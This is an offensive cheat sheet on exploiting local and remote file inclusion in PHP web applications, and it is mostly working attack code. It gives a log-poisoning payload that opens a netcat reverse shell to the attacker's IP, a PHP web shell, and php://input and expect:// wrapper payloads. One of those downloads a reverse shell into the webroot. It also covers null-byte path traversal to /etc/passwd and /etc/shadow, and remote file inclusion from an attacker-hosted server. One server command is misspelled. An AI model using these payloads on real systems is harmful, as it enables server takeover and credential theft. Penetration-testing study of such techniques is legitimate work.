# Local & Remote File Inclusion Attacks
> tips for exploiting LFI/RFI on a web app

## LFI
- common on loading files or images via URL params
-----
#### Log Poisoning -> LFI to RCE
- if you can use LFI to retrieve log resource
1. set listener
2. change user-agent to this to this and then submit and use LFI again to request log resource
```<?php exec('rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2>&1|nc [my-ip] 4444 >/tmp/f') ?>```
- Alternative method: 
1. connect via nc
```nc -nv [ip] 80```
2. send payload: 
```<?php echo '<pre>' . shell_exec($_GET['cmd']) . '</pre>';?>```
- ignore the potential 400 Bad Request response
3. request the log file to execute the injected code (windows): 
```http://[ip]/examplePage.php?vulnerable=c:\xampp\apache\logs\access.log&cmd=ipconfig```

##### Files to check for
- /etc/passwd -> find users on the system
- /etc/shadow -> if you can read this than the server is running the web app with root user, any rev shell will be auto-rooted
- 'c:\boot.ini' -> bootloader file, often has exact OS version info

#### PHP Wrappers
- expect wrapper can be used to escalate to OS cmd injection
	- ```http://[ip]/vulnerable.php?param=expect://ls```
- input wrapper can send a reverse shell or OS cmds in the POST body: 
	- using curl: 
		- ```curl -X POST http://[ip]/vulnerable.php?param=php://input -d "<? system('uname -a');?>"```
	- reverse shell variant: 
		- ```curl -X POST http://[ip]/vulnerable.php?param=php://input -d "<? system('wget http://[my-ip]/php-reverse-shell.php -O /var/www/shell.php');?>"```
		- then navigate to the uploaded shell

#### Null Byte
- add ```%00``` to the end of an injection to stop the app from adding an expected filetype to the end
	- ```../../../../../../../../../../../etc/passwd%00```

## RFI
------
- start HTTP server:
	- ```nc -nvlp 80```  OR  ```python3 -m http.sever 80```
- inject a URL to your HTTP server on your machine into vulnerable param
	- ```http://[ip]/vulnerable.php?param=http://[my-ip]/malicious-local-file```
